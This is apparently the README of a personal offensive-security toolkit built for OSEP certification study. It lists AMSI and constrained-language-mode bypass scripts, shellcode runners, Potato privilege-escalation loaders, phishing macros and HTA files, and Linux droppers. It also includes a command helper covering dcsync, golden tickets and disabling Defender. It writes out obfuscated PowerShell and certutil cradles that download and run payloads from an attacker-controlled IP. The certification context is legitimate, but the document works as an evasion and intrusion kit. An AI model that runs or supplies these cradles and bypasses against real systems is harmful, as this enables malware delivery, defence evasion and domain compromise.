# OSEP

This is just for my osep.

Only tested on Kali-2023.3

## Install

Update
```
sudo apt-get update && sudo apt-get upgrade -y
```

Install dependencies
```
python3 -m pip install -r requirements.txt
sudo apt install -y mono-complete
```

Generate SSL certs for meterpreter
```
./gen_metreperter_cert.sh
```

### Install arsenal (Optional)

https://github.com/Orange-Cyberdefense/arsenal

Install arsenal
```
sudo python3 -m pip install arsenal-cli
```

Add alias (Kali)
```
echo \"alias a='${DIR}/run'\" >> ~/.zshrc
```

Fix arsenal issues on Kali

https://github.com/Orange-Cyberdefense/arsenal/issues/61
```
1. run: sudo vim /etc/sysctl.conf
2. paste: dev.tty.legacy_tiocsti=1
3. Save
4. run: sudo sysctl -p
```

## Usage
```
python3 gen_payload.py -i <IP or InterfaceName> -p <meterpreter port> -a <x64 or x86>

Example:
python3 gen_payload.py -i tun0 -p 443 -a x64
```

## meterpreter
```
msfconsole -q -r win64-staged-https.rc
```

## Main payload files
### Windows:

|                                     Name |                                                                                                                     Description |
|------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------|
|                                    a.ps1 |                                                                                                       Bypass AMSI in Powershell |
|                            awsi_buff.ps1 |                                                                           Bypass AMSI in Powershell & CSharp (Patch ScanBuffer) |
|                                 lsal.ps1 |                                                                   load amsi bypass & shellcode runner (aes, embedded shellcode) |
|                                 lsar.ps1 |                                                              load amsi bypass & shellcode runner (aes, load shellcode remotely) |
|                               lacxsr.ps1 |                                                     load amsi bypass & shellcode runner (caesar & xor, load shellcode remotely) |
|                              clm_rev.ps1 |                               Bypass clm with Installutil.exe and run amsi bypass & nc_reverse_tcp. Default revserse port 8443. |
|                                  clm.ps1 | Download and execute bypass_clm_with_installutil.exe with InstallUtil.exe. bypass_clm_with_installutil.exe will load lacxsr.ps1 |
|                   bypass_clm_cxshell.exe |                                                                                                  bypass clm and load lacxsr.ps1 |
|                                 bads.ps1 |                                                                                                             BadPotato + clm.ps1 |
|                                lbads.ps1 |                                                                                        AMSI bypass(Patch ScanBuffer) + bads.ps1 |
|                                 gods.ps1 |                                                                                                             GodPotato + clm.ps1 |
|                                lgods.ps1 |                                                                                        AMSI bypass(Patch ScanBuffer) + gods.ps1 |


Useful files
```
i`e`x(iWr -UsEbaSIcparSING http://IP/lacxsr.ps1);
i`e`x(iWr -UsEbaSIcparSING http://IP/clm_rev.ps1);
i`e`x(iWr -UsEbaSIcparSING http://IP/clm.ps1);
i`e`x(iWr -UsEbaSIcparSING http://IP/lbads.ps1);
```


### Phishing
| Name                                 | Description                                             |
|--------------------------------------|---------------------------------------------------------|
| macro_bypass_clm_with_installutil.vb | load clm.ps1                                            |
| shellcode_runner_caesar.vb           | shellcode runner                                        |
| clm_cert.hta                         | load bypass_clm_with_installutil.exe using certutil.exe |
| clm_ps.hta                           | load clm.ps1                                            |

### Linux
| Name         | Description                      |
|--------------|----------------------------------|
| shellxor.elf | shellcode runner (xor)           |
| dropper.elf  | download and execte shellxor.elf |
| dropper.sh   | download and execte shellxor.elf |

## Other tools
### tools/searchcommand.py 
```
$ ./tools/searchcommand.py 
0. Download_File
1. chisel
2. Get-DomainTrust
3. Get-DomainSID
4. PowerUpSQL
5. MSSQL
6. BloodHound
7. GoldenTicket
8. Dump-TrustKey
9. dcsync
10. Unconstrained_Delegation
11. Constrained_Delegation_with_protocol_transition
12. Constrained_Delegation_without_protocol_transition
13. rbcd_Resource_Based_Constrained_Delegation
14. to_parent_domain_using_krbtgt
15. to_parent_domain_using_trustkey
16. cross_forest_with_extraSID
17. schtasks
18. disable_defender
19. sc
```

```
$ ./tools/searchcommand.py -c 0
=================================
=    [Windows] Download_File    =
=================================
# Default listen ip on tun0, listen port on 80
# certutil.exe
certutil.exe -urlcache -f http://tun0_ip:80/{{filename}} {{filename}}

# PowerShell
iwr "http://tun0_ip:80/{{filename}}" -OutFile "{{filename}}"
powershell i`e`x(iWr -UsEbaSIcparSING http://tun0_ip:80/{{filename}});
```

### tools/make_assembly_loader.py

```
python3 tools/make_assembly_loader.py -c BadPotato.ExecuteRectangle -f Invoke-BadPotato -enc thirdparty/BadPotato.exe out/BadPotato.ps1
```

## Reference
https://github.com/tree-chtsec/osep-tools